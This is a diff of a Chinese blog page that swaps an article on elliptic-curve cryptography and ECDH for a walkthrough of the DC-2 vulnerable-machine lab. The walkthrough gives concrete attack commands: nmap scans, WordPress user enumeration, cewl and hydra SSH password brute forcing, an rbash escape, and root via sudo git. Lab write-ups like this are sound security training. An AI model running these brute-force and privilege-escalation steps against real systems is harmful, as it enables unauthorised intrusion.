@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>ECC - Clock-X</title>
+  <title>DC-2 - Clock-X</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="ECC">
+            <span class="h2" id="subtitle" title="DC-2">
               
             </span>
 
@@ -185,8 +185,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-03-31 20:09" pubdate>
-        March 31, 2021 pm
+      <time datetime="2021-05-28 12:39" pubdate>
+        May 28, 2021 pm
       </time>
     </span>
   
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      584 字
+      366 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      5
        分钟
     </span>
   
@@ -237,39 +237,51 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">ECC</h1>
+            <h1 style="display: none">DC-2</h1>
             
             <div class="markdown-body">
-              <h1 id="ECC椭圆加密曲线"><a href="#ECC椭圆加密曲线" class="headerlink" title="ECC椭圆加密曲线"></a>ECC椭圆加密曲线</h1><h2 id="椭圆曲线的定义"><a href="#椭圆曲线的定义" class="headerlink" title="椭圆曲线的定义"></a>椭圆曲线的定义</h2><p>Z<sub>p</sub>(p&gt;3)上的椭圆曲线指满足以下条件的所有对(x,y) ∈ Z<sub>p</sub> 的集合：</p>
-<p>​                y<sup>2</sup> ≡ x<sup>3</sup> + a*x + b mod p</p>
-<p>以及一个无穷大的虚数点此处记为G，其中（a,b）∈ Z<sub>p</sub></p>
-<p>且满足条件4*a<sup>3</sup> + 27*b<sup>2</sup> ≠ 0 mod p。</p>
-<p><img src="https://i.loli.net/2021/04/19/a7mLQni4vqOW6BJ.png" srcset="/img/loading.gif" lazyload alt="image-20210331001025785.png"></p>
-<h2 id="椭圆曲线上的群操作"><a href="#椭圆曲线上的群操作" class="headerlink" title="椭圆曲线上的群操作"></a>椭圆曲线上的群操作</h2><p>可以用加法符号”+“来表示群操作，两点相“加”得到第三点</p>
-<p>P + Q =R</p>
-<p>即(x<sub>1</sub> , y<sub>1</sub> ) + (x<sub>2</sub> , y<sub>2</sub>) = (x<sub>3</sub> , y<sub>3</sub>)</p>
-<p>两点相“加”的方式与这两点是否是相同点有关</p>
-<h4 id="相异点连线的交点并关于X轴对称的点即为得到的点："><a href="#相异点连线的交点并关于X轴对称的点即为得到的点：" class="headerlink" title="相异点连线的交点并关于X轴对称的点即为得到的点："></a>相异点连线的交点并关于X轴对称的点即为得到的点：</h4><p><img src="https://i.loli.net/2021/04/19/Dg6SMByqOF28zhw.png" srcset="/img/loading.gif" lazyload alt="image-20210331001246350.png"></p>
-<h4 id="相同点切线的交点取对称："><a href="#相同点切线的交点取对称：" class="headerlink" title="相同点切线的交点取对称："></a>相同点切线的交点取对称：</h4><p><img src="https://i.loli.net/2021/04/19/pFY2QxdetEqJIbf.png" srcset="/img/loading.gif" lazyload alt="image-20210331001501795.png"></p>
-<p>其坐标点的关系：</p>
-<p>$$<br>x_3 = s^2 - x_1 - x_2;mod;p\<br>y_3 = s(x_1 - x_3) - y_1;mod;p\<br>;\<br>其中s的值会因情况不同而变化\<br>;\<br>s=\left{<br>\begin{array}{c}<br>\frac {y_2 - y_1}{x_2 - x_1};mod;p;;P≠Q\<br>\frac{3x^2_1 + a}{2y_1};mod;p;;P=Q<br>\end{array}<br>\right.<br>$$<br>注意：P + G =P    P + (-P) = G </p>
-<p>P(x<sub>p</sub> , y<sub>p</sub>)的逆元为-P(x<sub>p</sub> , -y<sub>p</sub>)，若在素数域上，则-P(x<sub>p</sub> , P-y<sub>p</sub>)</p>
-<p>对于椭圆加密曲线的群操作，相当于把以前的群的数字变成了坐标点，群操作也只是变得稍微抽象了一些。</p>
-<p>所以同样的，曲线上的点可以与G一起构成循环子群</p>
-<p>假如一个群的阶数为X，那么X*P = G，（X+1）* P = P</p>
-<p>相当于把之前的群的知识类比过来。</p>
-<h4 id="自然而然我们就可以构建出基于椭圆曲线的离散对数问题："><a href="#自然而然我们就可以构建出基于椭圆曲线的离散对数问题：" class="headerlink" title="自然而然我们就可以构建出基于椭圆曲线的离散对数问题："></a>自然而然我们就可以构建出基于椭圆曲线的离散对数问题：</h4><h4 id="P-P-…-P-d-P-T"><a href="#P-P-…-P-d-P-T" class="headerlink" title="P + P + … +P = d*P =T"></a>P + P + … +P = d*P =T</h4><p>有了基于椭圆曲线的离散对数问题，我们自然也可以得到基于椭圆曲线的密钥交换：</p>
-<h4 id="基于椭圆加密曲线的密钥交换"><a href="#基于椭圆加密曲线的密钥交换" class="headerlink" title="基于椭圆加密曲线的密钥交换"></a>基于椭圆加密曲线的密钥交换</h4><h5 id="ECDH域参数选取："><a href="#ECDH域参数选取：" class="headerlink" title="ECDH域参数选取："></a>ECDH域参数选取：</h5><p>1.素数p和椭圆曲线：</p>
-<p>​                y<sup>2</sup> ≡ x<sup>3</sup> + a*x + b mod p</p>
-<p>2.本原元P = (x<sub>p</sub> , y<sub>p</sub>) (此点可循环生成所有点)</p>
-<h5 id="椭圆曲线-Diffie-Hellman-密钥交换（ECDH）："><a href="#椭圆曲线-Diffie-Hellman-密钥交换（ECDH）：" class="headerlink" title="椭圆曲线 Diffie-Hellman 密钥交换（ECDH）："></a>椭圆曲线 Diffie-Hellman 密钥交换（ECDH）：</h5><p>Alice:                                                                                       Bob:</p>
-<p>选择k<sub>prA</sub> = a ∈ {2,3,…,#E-1}                             选择k<sub>prB</sub> = b ∈ {2,3,…,#E-1}</p>
-<p>计算k<sub>pubA</sub> =aP =A = (x<sub>A</sub> , y<sub>A</sub>)                              计算k<sub>pubB</sub> = bP =B ∈(x<sub>B</sub> , y<sub>B</sub>)</p>
-<p>​                                             A———–&gt;</p>
-<p>​                                             &lt;————B</p>
-<p>而后两人分别计算aB = T<sub>AB</sub>    ,    bA = T<sub>AB</sub></p>
-<p>就得到了联合密钥：T（x<sub>AB</sub> , y<sub>AB</sub>）</p>
-<p>（为了方便，图片都是从《深入浅出密码学》这本书上拍的，不过也推荐一下这本书。）</p>
+              <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>先扫描当前网段下的ip确定靶机。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 192.168.93.0/24<br></code></pre></td></tr></table></figure>
+
+<p>扫描靶机开放的端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sV 192.168.93.152<br></code></pre></td></tr></table></figure>
+
+<p>发现开放80端口，用浏览器进行访问</p>
+<p>发现ip地址被直接转成了dc-2，而且无法访问，页面显示无法解析出ip地址</p>
+<p>进入kali下的/etc/hosts,在末尾加上192.168.93.152 dc-2即可。</p>
+<p>再次访问页面，可以正常访问。</p>
+<p>拿到flag1</p>
+<p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501230235415.png" srcset="/img/loading.gif" lazyload alt="image-20210501230235415"></p>
+<p>这里再次用nmap进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sS -Pn -A -p 1-65535 192.168.239.152<br></code></pre></td></tr></table></figure>
+
+<p>发现还扫出来一个7744端口，运行了ssh服务。</p>
+<p>flag1提示cewl，同时wordpress也是一种框架，可以寻找相关工具。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wpscan --url http://dc-2 --enumerate u#扫描关于wordpress的相关漏洞<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502210311471.png" srcset="/img/loading.gif" lazyload alt="image-20210502210311471"></p>
+<p>发现了三个用户。</p>
+<p>但并不知道密码，这里查询cewl用法，使用cewl生成密码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cewl -w 555.txt http://dc-2<br></code></pre></td></tr></table></figure>
+
+<p>再将用户写入txt文件，开始准备爆破ssh用户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L 444.txt -P 555.txt ssh://192.168.239.152 -s 7744 -vV指定7744端口ssh爆破用户名和密码。<br>wpscan --url http://dc-2/ -e u -U 444.txt -P 555.txt #这个也能爆。<br></code></pre></td></tr></table></figure>
+
+<p>登陆tom用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tom@192.168.239.152 -p 7744<br></code></pre></td></tr></table></figure>
+
+<p>发现是rbash，部分命令受限，绕过rbash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">BASH_CMDS[a]=/bin/sh;a<br>export PATH=$PATH:/bin/<br>export PATH=$PATH:/usr/bin<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br>cat flag3.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502223740131.png" srcset="/img/loading.gif" lazyload alt="image-20210502223740131"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">su jerry<br>cd /home/jerry<br>ls<br>cat flag4.txt<br></code></pre></td></tr></table></figure>
+
+<p>根据提示联想git提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l#查看sudo配置文件<br>sudo git help config#git提权<br>cd /root<br>ls<br>cat final-flag.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502231015330.png" srcset="/img/loading.gif" lazyload alt="image-20210502231015330"></p>
 
             </div>
             <hr>
@@ -279,7 +291,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/knowledge-crypto/">knowledge-crypto</a>
+                      <a class="hover-with-bg" href="/categories/redteam/">redteam</a>
                     
                   </div>
                 
@@ -287,7 +299,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Crypto-ECC/">-Crypto -ECC</a>
+                      <a class="hover-with-bg" href="/tags/web-DC/">-web -DC</a>
                     
                   </div>
                 
@@ -304,9 +316,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/">
+                      <a href="/2021/05/28/DC-3/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">格相关</span>
+                        <span class="hidden-mobile">DC-3</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -314,8 +326,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/31/LFSR/">
-                        <span class="hidden-mobile">LFSR</span>
+                      <a href="/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/">
+                        <span class="hidden-mobile">格相关</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -473,45 +485,6 @@
 
 
 
-
-  
-
-  
-    <!-- MathJax -->
-    <script>
-      MathJax = {
-        tex: {
-          inlineMath: [['$', '$'], ['\\(', '\\)']]
-        },
-        options: {
-          renderActions: {
-            findScript: [10, doc => {
-              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
-                const display = !!node.type.match(/; *mode=display/);
-                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
-                const text = document.createTextNode('');
-                node.parentNode.replaceChild(text, node);
-                math.start = { node: text, delim: '', n: 0 };
-                math.end = { node: text, delim: '', n: 0 };
-                doc.math.push(math);
-              });
-            }, '', false],
-            insertedScript: [200, () => {
-              document.querySelectorAll('mjx-container').forEach(node => {
-                let target = node.parentNode;
-                if (target.nodeName.toLowerCase() === 'li') {
-                  target.parentNode.classList.add('has-jax');
-                }
-              });
-            }, '', false]
-          }
-        }
-      };
-    </script>
-
-    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-svg.js" ></script>
-
-  
 
 
 
